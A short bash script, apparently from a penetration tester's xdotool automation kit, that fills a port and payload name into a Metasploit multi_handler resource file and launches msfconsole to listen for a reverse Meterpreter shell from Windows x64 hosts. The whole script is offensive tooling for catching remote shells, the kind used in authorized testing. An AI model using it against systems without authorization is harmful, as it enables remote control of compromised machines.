#!/bin/bash

: '
meterpreter: start reverse meterpreter windows x64 tcp rev shell
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh

# Generate gui form
generate_form "LPORT"

LPORT=${form_data["LPORT"]}
PAYLOAD="${1}"
FILES_FOLDER="$HOME/Desktop/base/code/xdotool/scripts/shell/msfconsole/.files"

SRC_FILE="${FILES_FOLDER}/multi_handler.rc"
TMP_FILE="${FILES_FOLDER}/multi_handler_tmp.rc"

replace_in_file "${SRC_FILE}" "${TMP_FILE}" "[LPORT]" "${LPORT}" "[payload]" "${PAYLOAD}"

paste_command "msfconsole -r ${TMP_FILE}"
xdotool key Return

sleep 30
rm $TMP_FILE